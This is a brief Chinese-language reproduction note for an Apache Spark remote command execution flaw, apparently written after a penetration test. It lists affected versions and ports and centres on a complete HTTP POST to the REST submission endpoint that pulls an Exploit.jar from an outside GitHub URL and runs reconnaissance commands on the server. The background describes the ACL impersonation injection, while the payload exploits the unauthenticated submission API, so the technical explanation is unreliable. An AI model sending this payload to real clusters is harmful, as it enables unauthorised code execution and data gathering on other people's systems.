## 0x00 漏洞背景

        之前渗透时候发现了这个界面复现一下。
        
        Apache Spark存在一处命令注入，该漏洞是由于Apache Spark UI提供了通过配置选项spark.acls.enable启用ACL的可能性，
        HttpSecurityFilter中的代码路径可以通过提供任意用户名来允许某人执行模拟，恶意用户凭借访问权限检查函数最终将基于其输入构建Unix shell命令并执行它。
        
        
![图片](https://user-images.githubusercontent.com/118274389/230276100-cd56142e-4427-4da9-b425-fe1711cded27.png)

## 0x01 漏洞影响范围

       versions 3.0.3
       3.1.1 -- 3.1.2
       3.2.0 -- 3.2.1
       影响端口 6066 7077 端口
       
## 0x02 漏洞复现

访问如下
       
```

POST /v1/submissions/create HTTP/1.1
Host: IP:6066
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Content-Type: application/json
Connection: close
Content-Length: 683

{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": [
    "id_whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
  ],
  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://your-ip:6066"
  }
}

```
       
        
